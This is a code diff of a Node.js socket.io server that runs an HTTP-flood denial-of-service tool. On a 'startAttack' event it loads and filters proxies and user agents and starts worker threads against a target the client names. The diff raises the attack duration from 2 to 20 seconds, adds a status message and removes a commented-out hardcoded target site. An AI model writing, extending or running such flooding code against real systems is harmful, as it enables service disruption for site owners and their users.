@@ -32,15 +32,17 @@ const io = new Server(httpServer, {
 io.on("connection", (socket) => {
     console.log("Client connected");
 
+    socket.emit('stats', {
+        log: "Connection established"
+    })
+
     socket.on("startAttack", (params) => {
         // const {target, duration, packetDelay, packetSize} = params;
         const {target} = params;
-        // const target = 'https://shg2.radolyn.com';
-
 
         const filteredProxies = filterProxies(loadProxies(), AttackMethod.HTTPFlood);
         const userAgents = loadUserAgents();
-        const duration = 2;
+        const duration = 20;
         const packetDelay = 1000;
         const packetSize = 64;
 
@@ -98,6 +100,7 @@ io.on("connection", (socket) => {
             worker.terminate();
         }
         console.log("Client disconnected");
+
     });
 })
 
